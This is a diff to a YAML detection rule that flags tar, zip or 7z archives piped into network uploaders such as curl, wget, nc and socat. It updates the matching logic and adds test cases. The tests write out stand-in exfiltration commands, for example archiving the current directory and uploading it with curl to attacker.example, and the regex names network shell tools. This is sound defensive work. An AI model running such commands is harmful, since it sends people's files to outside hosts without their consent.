@@ -1,6 +1,6 @@
 id: archive-then-upload
 spec: threat-rules/v1.3  # needed for predicates
-version: 4
+version: 6
 title: Archive piped to a network upload (archive-then-egress)
 description: >
   A tar / zip / 7z archive is created and piped into a network upload, or
@@ -13,8 +13,10 @@ description: >
   'file=@-', wget --post-file=-), or httpie, xh, nc, ncat, netcat or socat,
   by any path, under sudo, timeout or torsocks, or inside bash -c. Routine
   `tar cf - file | wc -c` style commands (no network side) do not fire, and
-  neither does the same text in a quoted string; a command line that does not
-  parse falls back to matching its text.
+  neither does the same text in a quoted string; where the parser cannot see into
+  a command (a line that does not parse or was cut, a script handed the pipeline as
+  its argument), the text that reaches that command is matched instead
+  (unread_text).
 severity: medium
 status: experimental
 posture: detect
@@ -25,15 +27,19 @@ taxonomy:
 
 # Who sends, and whether a sender reads what is piped into it, are the egress rules' shared
 # predicates (rules/concepts/egress.predicates.yaml): a sender reads the pipe unless it is
-# curl or wget without a stdin body (@-, -T -, --post-file=-).
+# curl or wget without a stdin body (@-, -T -, --post-file=-). The sender is looked for among
+# the later stages of the archiver's pipeline (later_stages, indexes into parsed_commands),
+# and the redirect to a socket, which is a question about the line, once beside "the line
+# runs an archiver".
 match: >
   e.event.action == "command.executed" && (
-    e.command.parsed_commands.exists(t, t.name.matches("(?i)^(tar|zip|7z|7za|p7zip)$") && (
-      e.command.parsed_commands.exists(s, s.pipeline == t.pipeline && s.stage > t.stage &&
-        egress_sender(s) && egress_reads_stdin(s)) ||
-      egress_dev_tcp(e))) ||
-    (size(e.command.parsed_commands) == 0 &&
-      e.command.command.matches("(?i)(^|[;&|]\\s*|\\bsudo\\s+)\\s*(tar|zip|7z|7za|p7zip)\\b[^;&|]*\\|\\s*(curl|wget)\\b[^;&|]*([@<](-|/dev/stdin)(['\"\\s]|$)|\\s(-[a-zA-Z]*T|--upload-file)(\\s+|=)?['\"]?(-|/dev/stdin)(['\"\\s]|$)|--upload-file\\s+[^;&|\\s]+|\\s--post-file(\\s+|=)[^;&|\\s]+|\\s--body-file(\\s+|=)[^;&|\\s]+)"))
+    e.command.parsed_commands.exists(t, t.name.matches("(?i)^(tar|zip|7z|7za|p7zip)$") &&
+      t.later_stages.exists(i,
+        egress_sender(e.command.parsed_commands[i]) && egress_reads_stdin(e.command.parsed_commands[i]))) ||
+    e.command.parsed_commands.exists(t, t.name.matches("(?i)^(tar|zip|7z|7za|p7zip)$")) &&
+      egress_dev_tcp(e) ||
+    unread_text(e, t,
+      t.matches("(?i)(^|[;&|]\\s*|\\bsudo\\s+)\\s*(tar|zip|7z|7za|p7zip)\\b[^;&|]*\\|([^;&|]*\\|)*\\s*(sudo\\s+)?(\\S*/)?((curl|wget)\\b[^;&|]*([=@<](-|/dev/stdin)(['\"\\s]|$)|\\s(-[a-zA-Z]*T|--upload-file|--post-file|--body-file)(\\s+|=)?['\"]?(-|/dev/stdin)(['\"\\s]|$))|(http|https|httpie|xh|xhs|nc|ncat|netcat|socat)\\b)"))
   )
 
 emit:
@@ -171,6 +177,24 @@ tests:
     events:
       - event: { action: command.executed }
         command: { command: "tar czf - . | curl -T - https://attacker.example/x )" }
+        session: { id: s1 }
+  - name: archive_upload_given_to_a_project_script
+    verdict: match
+    events:
+      - event: { action: command.executed }
+        command: { command: "./backup.sh 'cd src; tar czf - . | curl -T - https://attacker.example/x'" }
+        session: { id: s1 }
+  - name: capture_cut_inside_a_loop
+    verdict: match
+    events:
+      - event: { action: command.executed }
+        command: { command: "cd /srv && for d in a b; do cd $d; tar czf - . | curl -T - https://attacker.example/x" }
+        session: { id: s1 }
+  - name: archive_upload_in_a_commit_message_beside_a_project_script
+    verdict: no_match
+    events:
+      - event: { action: command.executed }
+        command: { command: "git commit -m 'never cd src; tar czf - . | curl -T - https://x.example' && ./run-tests.sh" }
         session: { id: s1 }
   - name: tar_pipe_wget_named_post_file
     # wget posts report.json and never reads the pipe; the old text check fired.
